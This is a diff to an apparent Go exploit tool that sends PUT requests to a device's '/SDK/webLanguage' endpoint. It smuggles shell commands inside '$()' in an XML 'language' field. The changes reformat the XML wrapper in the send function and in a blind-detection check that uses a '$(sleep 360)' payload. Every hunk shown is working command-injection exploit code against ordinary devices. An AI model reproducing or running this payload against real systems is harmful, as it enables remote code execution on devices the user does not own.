@@ -109,9 +109,9 @@ func (target Target) send(url string, request_data interface{}) (HttpResponse, e
 		data = ""
 		method = http.MethodGet
 	case []byte:
-		data = fmt.Sprintf("<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(%v)</language>", string(v))
+		data = fmt.Sprintf("<xml><language>$(%v)</language></xml>", string(v))
 	case string:
-		data = fmt.Sprintf("<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(%v)</language>", v)
+		data = fmt.Sprintf("<xml><language>$(%v)</language></xml>", v)
 	}
 
 	req, err := http.NewRequest(method, full_url, strings.NewReader(data))
@@ -156,7 +156,7 @@ func (target Target) checkBlind() Result {
 	full_url := fmt.Sprintf("%v://%v:%v%v", target.proto, target.host, target.port, "/SDK/webLanguage")
 
 	// no payload
-	data := "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>en</language>"
+	data := "<xml><language>en</language></xml>"
 	req, _ := http.NewRequest(http.MethodPut, full_url, strings.NewReader(data))
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
 	req.Header.Set("Host", fmt.Sprintf("%v:%v", target.host, target.port))
@@ -173,7 +173,7 @@ func (target Target) checkBlind() Result {
 	}
 
 	// with payload
-	data = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(sleep 360)</language>"
+	data = "<xml><language>$(sleep 360)</language></xml>"
 	req, _ = http.NewRequest(http.MethodPut, full_url, strings.NewReader(data))
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
 	req.Header.Set("Host", fmt.Sprintf("%v:%v", target.host, target.port))
